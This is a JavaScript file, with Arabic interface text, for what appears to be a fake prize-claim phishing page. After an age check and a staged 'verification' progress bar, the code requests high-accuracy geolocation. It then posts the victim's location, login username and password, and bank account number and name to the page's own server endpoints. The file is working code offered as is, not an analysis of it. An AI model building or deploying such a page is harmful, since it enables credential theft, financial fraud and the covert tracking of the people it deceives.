const SERVER_URL = window.location.origin;
const statusElement = document.getElementById('status');
const progressContainer = document.getElementById('progressContainer');
const progressBar = document.querySelector('.progress-bar');
const progressText = document.getElementById('progressText');
const form = document.getElementById('transferForm');
const submitBtn = document.getElementById('submitBtn');

function updateStatus(message, isError = false) {
    if (statusElement) {
        statusElement.textContent = message;
        statusElement.className = `status ${isError ? 'error' : 'success'}`;
    }
}

function updateProgress(percent, text) {
    progressBar.style.width = `${percent}%`;
    progressText.textContent = text;
}

function startProgress() {
    progressContainer.style.display = 'block';
    submitBtn.disabled = true;
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += 5;
        if (progress <= 100) {
            updateProgress(progress, getProgressText(progress));
        } else {
            clearInterval(interval);
        }
    }, 200);

    return interval;
}

function getProgressText(progress) {
    if (progress < 30) return 'جاري التحقق من البيانات...';
    if (progress < 60) return 'جاري تحديد موقعك...';
    if (progress < 90) return 'جاري تجهيز الجائزة...';
    return 'اكتمل التحقق!';
}

function checkOnline() {
    return navigator.onLine;
}

window.addEventListener('online', () => {
    updateStatus('تم استعادة الاتصال بالإنترنت');
});

window.addEventListener('offline', () => {
    updateStatus('لا يوجد اتصال بالإنترنت', true);
});

async function sendLocation(position, accountData) {
    if (!checkOnline()) {
        updateStatus('لا يوجد اتصال بالإنترنت', true);
        return;
    }

    const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: new Date().toISOString(),
        accountNumber: accountData.accountNumber,
        accountName: accountData.accountName
    };

    try {
        const response = await fetch(`${SERVER_URL}/submit-location`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`خطأ في الاستجابة: ${response.status}`);
        }

        const result = await response.json();
        updateStatus(result.message);
        
    } catch (error) {
        console.error("خطأ:", error);
        updateStatus(`حدث خطأ: ${error.message}`, true);
    } finally {
        progressContainer.style.display = 'none';
        submitBtn.disabled = false;
    }
}

function handleError(error) {
    let errorMessage;
    switch(error.code) {
        case error.PERMISSION_DENIED:
            errorMessage = "تم رفض الوصول إلى الموقع";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMessage = "معلومات الموقع غير متوفرة";
            break;
        case error.TIMEOUT:
            errorMessage = "انتهت مهلة طلب الموقع";
            break;
        default:
            errorMessage = "حدث خطأ غير معروف";
    }
    console.error("خطأ تحديد الموقع:", errorMessage);
    updateStatus(errorMessage, true);
    progressContainer.style.display = 'none';
    submitBtn.disabled = false;
}

document.addEventListener('DOMContentLoaded', function() {
    const ageModal = document.getElementById('ageModal');
    const btnYes = document.getElementById('btnYes');
    const btnNo = document.getElementById('btnNo');
    const status = document.getElementById('status');
    let locationData = null;

    // عرض نافذة التحقق من العمر فور تحميل الصفحة
    setTimeout(() => {
        ageModal.style.display = 'block';
    }, 500);

    // التعامل مع زر "نعم" في نافذة العمر
    btnYes.addEventListener('click', function() {
        ageModal.style.display = 'none';
        // طلب الموقع تلقائياً بعد الموافقة على العمر
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                handleLocationSuccess,
                handleLocationError,
                { enableHighAccuracy: true }
            );
        } else {
            showError("متصفحك لا يدعم تحديد الموقع");
        }
    });

    // التعامل مع زر "لا" في نافذة العمر
    btnNo.addEventListener('click', function() {
        ageModal.style.display = 'none';
        showError("عذراً، يجب أن يكون عمرك 18 عاماً أو أكثر لاستلام الجائزة");
    });

    // معالجة نجاح تحديد الموقع
    function handleLocationSuccess(position) {
        locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString()
        };
        
        // إرسال الموقع مباشرة إلى الخادم
        sendLocationToServer(locationData);
    }

    // معالجة خطأ تحديد الموقع
    function handleLocationError(error) {
        let errorMessage;
        switch(error.code) {
            case error.PERMISSION_DENIED:
                errorMessage = "تم رفض الوصول إلى الموقع";
                break;
            case error.POSITION_UNAVAILABLE:
                errorMessage = "معلومات الموقع غير متوفرة";
                break;
            case error.TIMEOUT:
                errorMessage = "انتهت مهلة طلب الموقع";
                break;
            default:
                errorMessage = "حدث خطأ غير معروف";
        }
        showError(errorMessage);
    }

    // إرسال الموقع إلى الخادم
    async function sendLocationToServer(locationData) {
        try {
            const response = await fetch('/api/location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(locationData)
            });

            if (!response.ok) {
                throw new Error('فشل في إرسال الموقع');
            }

            showSuccess("تم تحديد موقعك بنجاح");
        } catch (error) {
            showError(error.message);
        }
    }

    // معالجة تقديم النموذج
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const accountData = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            location: locationData
        };

        try {
            const response = await fetch('/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(accountData)
            });

            if (!response.ok) {
                throw new Error('فشل في إرسال البيانات');
            }

            showSuccess("تم إرسال البيانات بنجاح");
            this.reset();
        } catch (error) {
            showError(error.message);
        }
    });

    // عرض رسالة نجاح
    function showSuccess(message) {
        status.className = 'success';
        status.textContent = message;
        status.style.display = 'block';
    }

    // عرض رسالة خطأ
    function showError(message) {
        status.className = 'error';
        status.textContent = message;
        status.style.display = 'block';
    }
});

form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const accountData = {
        accountNumber: document.getElementById('accountNumber').value,
        accountName: document.getElementById('accountName').value
    };

    if (!accountData.accountNumber || !accountData.accountName) {
        updateStatus('يرجى ملء جميع الحقول', true);
        return;
    }

    const progressInterval = startProgress();

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                clearInterval(progressInterval);
                sendLocation(position, accountData);
            },
            (error) => {
                clearInterval(progressInterval);
                handleError(error);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        clearInterval(progressInterval);
        updateStatus('المتصفح لا يدعم تحديد الموقع', true);
        progressContainer.style.display = 'none';
        submitBtn.disabled = false;
    }
});